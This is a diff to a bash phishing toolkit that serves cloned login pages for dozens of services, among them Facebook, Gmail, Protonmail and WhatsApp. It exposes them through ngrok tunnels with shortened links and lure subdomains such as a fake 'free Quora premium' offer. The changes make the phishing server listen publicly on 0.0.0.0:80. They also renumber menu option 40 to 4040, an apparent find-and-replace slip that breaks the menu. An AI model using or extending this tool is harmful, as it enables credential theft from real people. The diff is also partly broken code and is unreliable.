@@ -192,8 +192,8 @@ $bold          _|
 
 
 # Php webserver and port 
-host='127.0.0.1'
-port='8080'
+host='0.0.0.0'
+port='80'
 
 
 setup_clone(){
@@ -490,7 +490,7 @@ ngrok_start() {
 
 	{ sleep 9; clear; header; }
 	
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://0.0.0.0:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	
     url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
@@ -521,7 +521,7 @@ ngrok_start_customize() {
 
 	{ sleep 9; clear; header; }
 	
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://0.0.0.0:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	
     url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
@@ -552,7 +552,7 @@ ngrok_start_manual() {
 
 	{ sleep 9; clear; header; }
 	
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://0.0.0.0:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	
 	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
@@ -841,8 +841,8 @@ tunnel_customize() {
 
 start_manual_method() {
  
- cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 & 
-     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://127.0.0.1:8081 ${GREEN} for setup clone page "${WHITE}
+ cd .manual_attack && php -S "0.0.0.0:80" > /dev/null 2>&1 & 
+     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://0.0.0.0:80 ${GREEN} for setup clone page "${WHITE}
 	 echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} After setup clone page return to here and continue... "${WHITE}
 
 }
@@ -1015,7 +1015,7 @@ attack() {
 		${GREEN}[${WHITE}13${GREEN}]${CYAN} Facebook             ${GREEN}[${WHITE}37${GREEN}]${CYAN} Playstation    ${GREEN}[${WHITE}61${GREEN}]${CYAN} Vk                        
 		${GREEN}[${WHITE}14${GREEN}]${CYAN} Facebook Messenger   ${GREEN}[${WHITE}38${GREEN}]${CYAN} Protonmail     ${GREEN}[${WHITE}62${GREEN}]${CYAN} Whatsapp                   
 		${GREEN}[${WHITE}15${GREEN}]${CYAN} Facebook Security    ${GREEN}[${WHITE}49${GREEN}]${CYAN} Pubg           ${GREEN}[${WHITE}63${GREEN}]${CYAN} Wordpress                    
-		${GREEN}[${WHITE}16${GREEN}]${CYAN} Gmail                ${GREEN}[${WHITE}40${GREEN}]${CYAN} Quora          ${GREEN}[${WHITE}64${GREEN}]${CYAN} Xanga       
+		${GREEN}[${WHITE}16${GREEN}]${CYAN} Gmail                ${GREEN}[${WHITE}4040${GREEN}]${CYAN} Quora          ${GREEN}[${WHITE}64${GREEN}]${CYAN} Xanga       
 		${GREEN}[${WHITE}17${GREEN}]${CYAN} Goodreads            ${GREEN}[${WHITE}41${GREEN}]${CYAN} Reverly        ${GREEN}[${WHITE}65${GREEN}]${CYAN} Xbox     
 		${GREEN}[${WHITE}18${GREEN}]${CYAN} Hotstar              ${GREEN}[${WHITE}42${GREEN}]${CYAN} Reddit         ${GREEN}[${WHITE}66${GREEN}]${CYAN} Xing                                               
 		${GREEN}[${WHITE}19${GREEN}]${CYAN} Icloud               ${GREEN}[${WHITE}43${GREEN}]${CYAN} Reverbnation   ${GREEN}[${WHITE}67${GREEN}]${CYAN} Yahoo                                                     
@@ -1264,7 +1264,7 @@ attack() {
 			tunnel;;	
 			
 			
-	   40)  
+	   4040)  
 	        site="quora"
 			subdomain='http://get-quora-premium-account-for-free-lifetime'
 			tunnel;;	
